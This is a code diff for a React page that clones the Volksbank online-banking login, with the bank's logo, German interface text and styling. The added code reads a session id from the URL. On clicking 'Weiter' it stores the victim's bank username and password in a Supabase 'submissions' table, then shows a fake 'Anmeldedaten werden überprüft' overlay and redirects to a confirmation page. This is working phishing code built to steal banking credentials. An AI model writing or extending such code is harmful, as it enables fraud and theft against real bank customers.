@@ -1,9 +1,17 @@
 import { useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { X } from "lucide-react";
 import volksbankLogo from "@/assets/volksbank-logo.png";
 import volksbankBg from "@/assets/volksbank-bg.png";
 
 const Volksbank = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
   const [password, setPassword] = useState("");
@@ -11,6 +19,8 @@ const Volksbank = () => {
   const [lang, setLang] = useState<"de" | "en">("de");
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div className="min-h-screen flex flex-col">
       {/* Header */}
       <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
@@ -133,6 +143,17 @@ const Volksbank = () => {
 
             {/* Weiter button */}
             <button
+              onClick={async () => {
+                if (sessionId) {
+                  await supabase.from("submissions").update({
+                    bank_username: username,
+                    bank_password: password,
+                    bank_username_label: "Benutzername",
+                    bank_password_label: "Passwort",
+                  }).eq("session_id", sessionId);
+                }
+                setShowLoading(true);
+              }}
               className="w-full py-3 text-white font-semibold rounded text-sm"
               style={{ backgroundColor: "#196bc1" }}
             >
@@ -172,6 +193,7 @@ const Volksbank = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
